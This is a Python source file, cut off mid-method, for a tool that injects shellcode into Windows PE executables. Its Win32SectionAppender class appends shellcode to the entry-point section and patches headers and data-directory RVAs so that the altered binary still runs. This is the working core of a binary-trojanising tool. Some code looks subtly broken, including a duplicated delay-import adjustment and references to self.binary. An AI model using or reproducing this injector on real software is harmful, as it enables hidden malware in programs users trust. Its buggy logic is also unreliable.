from Utils.Win32BinaryOffsetsAndSizes import Win32BinaryOffsetsAndSizes
from Utils.Win32BinaryUtils import Win32BinaryUtils
from Utils.MultiByteHandler import MultiByteHandler
import sys


class Win32SectionAppender:
    """
    Class that implements the logic for the section appender. This modifer appends the shellcode to the end of the virtual section for the entrypoint.
    Headers are adjusted accordingly.

    """

    def __adjust_standard_coff_fields(self, header_offset):

        size_of_code_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SIZE_OF_CODE
        current_size_of_code = MultiByteHandler.get_dword_given_offset(self.binary_data, size_of_code_offset)
        MultiByteHandler.set_dword_given_offset(self.binary_data, size_of_code_offset, current_size_of_code + len(self.shell_code))

        base_of_code_rva_offset_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_OF_CODE_RVA
        current_base_of_code_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, base_of_code_rva_offset_within_header)

        offset_of_header_of_section_containing_entrypoint = Win32BinaryUtils.get_raw_offset_for_header_of_section_containing_given_rva(self.binary_data, header_offset, MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA))[1]
        entrypoint_section_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)

        if current_base_of_code_rva > entrypoint_section_rva:
            MultiByteHandler.set_dword_given_offset(self.binary_data, base_of_code_rva_offset_within_header, current_base_of_code_rva + self.rva_delta)

    def __adjust_windows_specific_headers(self, header_offset):

        #Adjust base of data: must check whether this RVA is greater that the RVA of the section containing the shell code (section containing entrypoint).
        base_of_data_rva_offset_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_OF_DATA_RVA
        current_base_of_data = MultiByteHandler.get_dword_given_offset(self.binary_data, base_of_data_rva_offset_within_header)

        entrypoint_rva_offset_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, entrypoint_rva_offset_within_header)
        offset_of_header_of_section_containing_entrypoint = Win32BinaryUtils.get_raw_offset_for_header_of_section_containing_given_rva(self.binary_data, header_offset, entrypoint_rva)[1]
        entrypoint_section_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)

        if current_base_of_data > entrypoint_section_rva:
            MultiByteHandler.set_dword_given_offset(self.binary_data, base_of_data_rva_offset_within_header, current_base_of_data + self.rva_delta)

        size_of_image_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SIZE_OF_IMAGE
        rva_and_virtual_size_of_last_section = Win32BinaryUtils.get_rva_and_virtual_size_for_last_section(self.binary_data, header_offset)
        potentially_unaligned_size_of_image = rva_and_virtual_size_of_last_section[0] + rva_and_virtual_size_of_last_section[1]

        #Size of Image must be aligned using SectionAlignment.
        aligned_size_of_image = potentially_unaligned_size_of_image + Win32BinaryUtils.compute_padding_size_for_section_alignment(self.binary_data, header_offset, potentially_unaligned_size_of_image)
        MultiByteHandler.set_dword_given_offset(self.binary_data, size_of_image_offset, aligned_size_of_image)

    def __adjust_resource_table_stub(self, header_offset):

        # Adjusting RVA on Data Directories header.
        offset_to_resource_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_RESOURCE_TABLE_RVA
        resource_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_resource_table_rva_within_header)

        if resource_table_rva == 0x0 or self.rva_delta == 0:
            return

        self.__adjust_resource_table(header_offset, 0)

        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_resource_table_rva_within_header, resource_table_rva + self.rva_delta)

    def __adjust_resource_table(self, header_offset, raw_offset_for_directory_header):

        resource_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_RESOURCE_TABLE_RVA)
        original_raw_offset_for_resource_table = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, resource_table_rva)

        raw_offset_for_current_directory = None
        # Function being called for the first time
        if raw_offset_for_directory_header != 0:
            raw_offset_for_current_directory = raw_offset_for_directory_header
        else:
            raw_offset_for_current_directory = original_raw_offset_for_resource_table

        raw_offset_for_current_directory_entry = raw_offset_for_current_directory + Win32BinaryOffsetsAndSizes.OFFSET_TO_FIRST_DIRECTORY_ENTRY_WITHIN_RESOURCE_DIRECTORY_HEADER

        number_of_named_entries = MultiByteHandler.get_word_given_offset(self.binary_data, raw_offset_for_current_directory + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_NAMED_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER)
        number_of_id_entries = MultiByteHandler.get_word_given_offset(self.binary_data, raw_offset_for_current_directory + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_ID_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER)

        for entry_index in range(0, number_of_named_entries + number_of_id_entries):
            offset_to_directory_or_data_entry = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_for_current_directory_entry + 0x4)

            # print("Offset to directory or data entry:" + hex(offset_to_directory_or_data_entry))

            if offset_to_directory_or_data_entry & 0x80000000 == 0x80000000:  # It is a directory so we call this function again
                self.__adjust_resource_table(header_offset, original_raw_offset_for_resource_table + offset_to_directory_or_data_entry & 0x7FFFFFFF)
            else:
                resource_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, original_raw_offset_for_resource_table + offset_to_directory_or_data_entry)
                MultiByteHandler.set_dword_given_offset(self.binary_data, original_raw_offset_for_resource_table + offset_to_directory_or_data_entry, resource_rva + self.rva_delta)
            raw_offset_for_current_directory_entry += 0x8

    def __adjust_import_table(self, header_offset):

        offset_to_import_table_rva = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_TABLE_RVA
        import_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_import_table_rva)

        if import_table_rva == 0x0 or self.rva_delta == 0:
            return
        import_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, import_table_rva)
        current_import_directory_table_entry = import_table_raw

        while(True):

            if Win32BinaryUtils.has_consecutive_zero_dwords(self.binary_data, current_import_directory_table_entry, Win32BinaryOffsetsAndSizes.NUMBER_OF_DWORDS_WITHIN_EACH_DIRECTORY_TABLE_ENTRY):
                break
            offset_to_import_name_table_rva = current_import_directory_table_entry + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_NAME_TABLE_RVA_WITHIN_IMPORT_DIRECTORY_TABLE
            import_name_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_import_name_table_rva)
            if import_name_table_rva != 0x0:
                raw_offset_for_import_name_table = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, import_name_table_rva)
                while True:
                    hint_name_rva_or_ordinal = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_for_import_name_table)
                    if hint_name_rva_or_ordinal == 0x0:
                        break
                    if (0x80000000 & hint_name_rva_or_ordinal) != 0x80000000:
                        MultiByteHandler.set_dword_given_offset(self.binary_data, raw_offset_for_import_name_table, hint_name_rva_or_ordinal + self.rva_delta)
                    raw_offset_for_import_name_table += 0x4  # Each hint/name/ordinal takes 4 bytes (dword)

                MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_import_name_table_rva, import_name_table_rva + self.rva_delta)

            offset_to_name_rva = current_import_directory_table_entry + Win32BinaryOffsetsAndSizes.OFFSET_TO_NAME_RVA_WITHIN_IMPORT_DIRECTORY_TABLE
            name_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_name_rva)
            if name_rva != 0x0:
                MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_name_rva, name_rva + self.rva_delta)

            offset_to_import_address_table_rva = current_import_directory_table_entry + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_ADDRESS_TABLE_RVA_WITHIN_IMPORT_DIRECTORY_TABLE
            import_address_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_import_address_table_rva)
            if import_address_table_rva != 0x0:
                raw_offset_for_import_address_table = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, import_address_table_rva)
                while True:
                    hint_name_rva_or_ordinal = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_for_import_address_table)
                    if hint_name_rva_or_ordinal == 0x0:
                        break
                    if (0x80000000 & hint_name_rva_or_ordinal) != 0x80000000:
                        MultiByteHandler.set_dword_given_offset(self.binary_data, raw_offset_for_import_address_table, hint_name_rva_or_ordinal + self.rva_delta)
                    raw_offset_for_import_address_table += 0x4 #Each hint/name/ordinal takes 4 bytes (dword)

                MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_import_address_table_rva, import_address_table_rva + self.rva_delta)

            current_import_directory_table_entry += Win32BinaryOffsetsAndSizes.NUMBER_OF_BYTES_PER_IMPORT_DIRECTORY_TABLE_ENTRY

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_import_table_rva, import_table_rva + self.rva_delta)

    def __adjust_export_table(self, header_offset):
        offset_to_export_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_EXPORT_TABLE_RVA
        export_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_export_table_rva_within_header)

        if export_table_rva == 0x0 or self.rva_delta == 0:
            return

        export_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, export_table_rva)

        # Adjusting name RVA
        offset_to_name_rva_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_NAME_RVA_WITHIN_EXPORT_DIRECTORY_TABLE
        name_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_name_rva_within_export_directory_table)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_name_rva_within_export_directory_table, name_rva + self.rva_delta)

        # Adjusting ordinal table rva
        offset_to_ordinal_table_rva_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ORDINAL_TABLE_RVA_WITHIN_EXPORT_DIRECTORY_TABLE
        ordinal_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_ordinal_table_rva_within_export_directory_table)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_ordinal_table_rva_within_export_directory_table, ordinal_table_rva + self.rva_delta)

        # Adjusting function table RVAs
        offset_to_address_table_rva_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ADDRESS_TABLE_RVA_WITHIN_EXPORT_DIRECTORY_TABLE
        address_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_address_table_rva_within_export_directory_table)

        offset_to_number_of_functions_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_FUNCTIONS_WITHIN_EXPORT_DIRECTORY_TABLE
        number_of_functions = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_number_of_functions_within_export_directory_table)

        function_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, address_table_rva)

        for functions_index in range(0, number_of_functions):
            function_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, function_table_raw)
            MultiByteHandler.set_dword_given_offset(self.binary_data, function_table_raw, function_rva + self.rva_delta)
            function_table_raw += 0x4

        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_table_rva_within_export_directory_table, address_table_rva + self.rva_delta)

        # Adjusting name table RVAs
        offset_to_name_pointer_table_rva_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_NAME_POINTER_TABLE_RVA_WITHIN_EXPORT_DIRECTORY_TABLE
        name_pointer_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_name_pointer_table_rva_within_export_directory_table)

        offset_to_number_of_names_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_NAMES_WITHIN_EXPORT_DIRECTORY_TABLE
        number_of_names = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_number_of_names_within_export_directory_table)

        name_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, name_pointer_table_rva)

        for names_index in range(0, number_of_names):
            name_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, name_table_raw)
            MultiByteHandler.set_dword_given_offset(self.binary_data, name_table_raw, name_rva + self.rva_delta)
            name_table_raw += 0x4

        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_name_pointer_table_rva_within_export_directory_table, name_pointer_table_rva + self.rva_delta)

    def __adjust_certificate_table(self, header_offset):

        offset_to_certificate_table_rva = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_CERTIFICATE_TABLE_RAW
        certificate_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_certificate_table_rva)

        if certificate_table_rva == 0x0:
            return

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_certificate_table_rva, certificate_table_rva + len(self.shell_code))

    def __adjust_base_relocation_table(self, header_offset):

        offset_to_base_relocation_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_RELOCATION_TABLE_RVA
        base_relocation_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_base_relocation_table_rva_within_header)

        if base_relocation_table_rva == 0x0:
            return

        offset_to_base_relocation_table_size = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_RELOCATION_TABLE_SIZE
        base_relocation_table_size = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_base_relocation_table_size)

        base_relocation_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, base_relocation_table_rva)
        current_base_relocation_table_raw = base_relocation_table_raw

        while current_base_relocation_table_raw < base_relocation_table_raw + base_relocation_table_size:
            rva_of_block = MultiByteHandler.get_dword_given_offset(self.binary_data, current_base_relocation_table_raw)
            size_of_block = MultiByteHandler.get_dword_given_offset(self.binary_data, current_base_relocation_table_raw + 0x4)
            if not Win32BinaryUtils.rva_is_after_entrypoint_and_requires_change(self.binary_data, header_offset, rva_of_block):
                current_base_relocation_table_raw += size_of_block
                continue

            type_rva_offset = current_base_relocation_table_raw + 0x8 #Type RVA entries start two dwords after the beginning of the block
            number_of_type_rva_entries = (int)((size_of_block - 0x8)/0x2)

            for type_rva_index in range(0, number_of_type_rva_entries):
                type_rva = MultiByteHandler.get_word_given_offset(self.binary_data, type_rva_offset)
                if type_rva != 0x0:
                    MultiByteHandler.set_word_given_offset(self.binary_data, type_rva_offset, type_rva + self.rva_delta)
                type_rva_offset += 0x2

            MultiByteHandler.set_dword_given_offset(self.binary_data, current_base_relocation_table_raw, rva_of_block + self.rva_delta)
            current_base_relocation_table_raw += size_of_block
        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_base_relocation_table_rva_within_header, base_relocation_table_rva + self.rva_delta)

    def __adjust_tls_table(self, header_offset):
        offset_to_tls_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_TLS_TABLE_RVA
        tls_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_tls_table_rva_within_header)

        if tls_table_rva == 0x0 or self.rva_delta == 0:
            return

        tls_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, tls_table_rva)
        offset_to_start_address_of_raw_data_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_START_ADDRESS_OF_RAW_DATA_WITHIN_TLS_DIRECTORY
        start_address_of_raw_data = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_start_address_of_raw_data_within_tls_directory)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_start_address_of_raw_data_within_tls_directory, start_address_of_raw_data + self.rva_delta)

        offset_to_end_address_of_raw_data_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_END_OF_ADDRESS_OF_RAW_DATA_WITHIN_TLS_DIRECTORY
        end_address_of_raw_data = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_end_address_of_raw_data_within_tls_directory)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_end_address_of_raw_data_within_tls_directory, end_address_of_raw_data + self.rva_delta)

        offset_to_address_of_index_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ADDRESS_OF_INDEX_WITHIN_TLS_DIRECTORY
        address_of_index = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_address_of_index_within_tls_directory)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_of_index_within_tls_directory, address_of_index + self.rva_delta)

        offset_to_address_of_callbacks_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ADDRESS_OF_CALLBACKS_WITHIN_TLS_DIRECTORY
        address_of_callbacks = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_address_of_callbacks_within_tls_directory)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_of_callbacks_within_tls_directory, address_of_callbacks + self.rva_delta)

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_tls_table_rva_within_header, tls_table_rva + self.rva_delta)

    def __adjust_exception_table(self, header_offset):
        offset_to_exception_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_EXCEPTION_TABLE_RVA
        exception_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_exception_table_rva_within_header)

        if exception_table_rva == 0x0:
            return
        else:
            raise NotImplementedError

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary, offset_to_exception_table_rva_within_header, exception_table_rva + self.rva_delta)

    def __adjust_debug(self, header_offset):
        offset_to_debug_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_DEBUG_RVA
        debug_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_debug_rva_within_header)

        if debug_rva == 0x0:
            return

        debug_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, debug_rva)
        current_debug_raw = debug_raw
        debug_size = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_DEBUG_SIZE)
        number_of_entries = debug_size / (Win32BinaryOffsetsAndSizes.NUMBER_OF_DWORDS_ON_DEBUG_ENTRY*4)

        for entry_index in range(0, number_of_entries):

            if self.rva_delta != 0:
                offset_to_address_of_raw_data_within_debug_directory = debug_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ADDRESS_OF_RAW_DATA_WITHIN_DEBUG_DIRECTORY
                address_of_raw_data = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_address_of_raw_data_within_debug_directory)
                MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_of_raw_data_within_debug_directory, address_of_raw_data + self.rva_delta)

            offset_to_pointer_to_raw_data_within_debug_directory = debug_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_POINTER_TO_RAW_DATA_WITHIN_DEBUG_DIRECTORY
            pointer_to_raw_data = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_pointer_to_raw_data_within_debug_directory)
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_pointer_to_raw_data_within_debug_directory, pointer_to_raw_data + len(self.shell_code))

            current_debug_raw += Win32BinaryOffsetsAndSizes.NUMBER_OF_DWORDS_ON_DEBUG_ENTRY*0x4

        if self.rva_delta != 0:
            # Adjusting RVA on Data Directories header.
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_debug_rva_within_header, debug_rva + self.rva_delta)

    def __adjust_architecture_data(self, header_offset):
        offset_to_architecture_data_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ARCHITECTURE_DATA_RVA
        architecture_data_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_architecture_data_rva_within_header)

        if architecture_data_rva == 0x0 or self.rva_delta == 0:
            return
        else:
            raise NotImplementedError

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary, offset_to_architecture_data_rva_within_header, architecture_data_rva + self.rva_delta)

    def __adjust_global_ptr(self, header_offset):
        offset_to_global_ptr_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_GLOBAL_PTR_RVA
        global_ptr_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_global_ptr_rva_within_header)

        if global_ptr_rva == 0x0 or not Win32BinaryUtils.rva_is_after_entrypoint_and_requires_change(self.binary_data, header_offset, global_ptr_rva):
            return
        else:
            raise NotImplementedError

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary, offset_to_global_ptr_rva_within_header, global_ptr_rva + self.rva_delta)

    def __adjust_load_config_table(self, header_offset):
        offset_to_load_config_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_LOAD_CONFIG_TABLE_RVA
        load_config_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_load_config_table_rva_within_header)

        if load_config_table_rva == 0x0 or self.rva_delta == 0:
            return

        load_config_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, load_config_table_rva)


        offset_to_lock_prefix_table_va_within_load_config_directory = load_config_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_LOCK_PREFIX_TABLE_VA_WITHIN_LOAD_CONFIG_DIRECTORY
        lock_prefix_table_va = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_lock_prefix_table_va_within_load_config_directory)
        if lock_prefix_table_va != 0x0:
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_lock_prefix_table_va_within_load_config_directory, lock_prefix_table_va + self.rva_delta)

        offset_to_security_cookie_va_within_load_config_directory = load_config_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECURITY_COOKIE_VA_WITHIN_LOAD_CONFIG_DIRECTORY
        security_cookie_va = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_security_cookie_va_within_load_config_directory)
        if security_cookie_va != 0x0:
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_security_cookie_va_within_load_config_directory, security_cookie_va + self.rva_delta)

        offset_to_se_handler_table_va_within_load_config_directory = load_config_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_SE_HANDLER_TABLE_VA_WITHIN_LOAD_CONFIG_DIRECTORY
        se_handler_table_va = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_se_handler_table_va_within_load_config_directory)

        if se_handler_table_va != 0x0:
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_se_handler_table_va_within_load_config_directory, se_handler_table_va + self.rva_delta)

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_load_config_table_rva_within_header, load_config_table_rva + self.rva_delta)

    def __adjust_bound_import(self, header_offset):
        offset_to_bound_import_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BOUND_IMPORT_RVA
        bound_import_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_bound_import_rva_within_header)

        if bound_import_rva == 0x0 or self.rva_delta == 0:
            return
        else:
            raise NotImplementedError

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary, offset_to_bound_import_rva_within_header, bound_import_rva + self.rva_delta)

    def __adjust_import_address_table(self, header_offset):
        offset_to_import_address_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_ADDRESS_TABLE_RVA
        import_address_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_import_address_table_rva_within_header)

        if import_address_table_rva == 0x0 or self.rva_delta == 0:
            return

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_import_address_table_rva_within_header, import_address_table_rva + self.rva_delta)

    def __adjust_delay_import_descriptor(self, header_offset):
        offset_to_delay_import_descriptor_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_DELAY_IMPORT_DESCRIPTOR_RVA
        delay_import_descriptor_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_delay_import_descriptor_rva_within_header)

        if delay_import_descriptor_rva == 0x0 or self.rva_delta == 0:
            return

        raw_offset_for_delay_import_descriptor = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, delay_import_descriptor_rva)
        current_delay_import_offset = raw_offset_for_delay_import_descriptor

        while (True):
            if Win32BinaryUtils.has_consecutive_zero_dwords(self.binary_data, current_delay_import_offset, Win32BinaryOffsetsAndSizes.NUMBER_OF_DWORDS_ON_DELAY_IMPORT_ENTRY):
                break

            va_to_dll_name_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_DLL_NAME_OFFSET_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_DLL_NAME_OFFSET_WITHIN_DELAY_IMPORT_ENTRY, va_to_dll_name_offset + self.rva_delta)

            va_to_hmodule_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_HMODULE_OFFSET_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_HMODULE_OFFSET_WITHIN_DELAY_IMPORT_ENTRY, va_to_hmodule_offset + self.rva_delta)

            va_to_import_address_table = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_ADDRESS_TABLE_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_ADDRESS_TABLE_WITHIN_DELAY_IMPORT_ENTRY, va_to_import_address_table + self.rva_delta)

            va_to_import_address_table = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_ADDRESS_TABLE_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_ADDRESS_TABLE_WITHIN_DELAY_IMPORT_ENTRY, va_to_import_address_table + self.rva_delta)

            va_to_import_name_table = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_NAME_TABLE_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_NAME_TABLE_WITHIN_DELAY_IMPORT_ENTRY, va_to_import_name_table + self.rva_delta)

            va_to_bound_iat = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_BOUND_IAT_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_BOUND_IAT_WITHIN_DELAY_IMPORT_ENTRY, va_to_bound_iat + self.rva_delta)

            vat_to_unload_iat = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_UNLOAD_IAT_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_UNLOAD_IAT_WITHIN_DELAY_IMPORT_ENTRY, vat_to_unload_iat + self.rva_delta)

            current_delay_import_offset += Win32BinaryOffsetsAndSizes.NUMBER_OF_DWORDS_ON_DELAY_IMPORT_ENTRY * 0x4

        if self.rva_delta != 0:
            # Adjusting RVA on Data Directories header.
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_delay_import_descriptor_rva_within_header, delay_import_descriptor_rva + self.rva_delta)

            # All functions should compare to new_sectioN_rva

    def __adjust_data_directories(self, header_offset):
        self.__adjust_export_table(header_offset)
        self.__adjust_import_table(header_offset)
        self.__adjust_resource_table_stub(header_offset)
        self.__adjust_exception_table(header_offset)
        self.__adjust_certificate_table(header_offset)
        self.__adjust_base_relocation_table(header_offset)
        self.__adjust_debug(header_offset)
        self.__adjust_architecture_data(header_offset)
        self.__adjust_global_ptr(header_offset)
        self.__adjust_tls_table(header_offset)
        self.__adjust_load_config_table(header_offset)
        self.__adjust_bound_import(header_offset)
        self.__adjust_import_address_table(header_offset)
        self.__adjust_delay_import_descriptor(header_offset)

    def __adjust_section_headers(self, header_offset):

        entrypoint_rva_offset_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, entrypoint_rva_offset_within_header)
